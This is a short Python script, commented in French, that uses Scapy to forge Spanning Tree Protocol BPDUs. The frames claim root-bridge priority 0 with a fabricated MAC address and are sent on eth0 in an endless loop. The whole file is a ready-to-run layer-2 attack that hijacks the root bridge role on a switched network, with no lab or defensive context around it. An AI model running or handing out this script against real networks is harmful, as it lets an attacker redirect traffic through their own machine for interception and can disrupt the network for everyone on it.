from scapy.all import *
import sys

# On se fait passer pour le root bridge avec priorité 0
bpdu = Dot3(dst="01:80:c2:00:00:00") / LLC() / STP(
    proto=0,
    version=0,
    bpdutype=0,
    bpduflags=0,
    rootid=0,           # priorité 0 = on veut être root
    rootmac="00:00:00:00:00:01",
    pathcost=0,
    bridgeid=0,
    bridgemac="00:00:00:00:00:01",
    portid=0x8001,
    age=0,
    maxage=20,
    hellotime=2,
    fwddelay=15
)

print("[*] Envoi de faux BPDUs STP en boucle...")
while True:
    sendp(bpdu, iface="eth0", verbose=False)
    print("[+] BPDU envoyé")
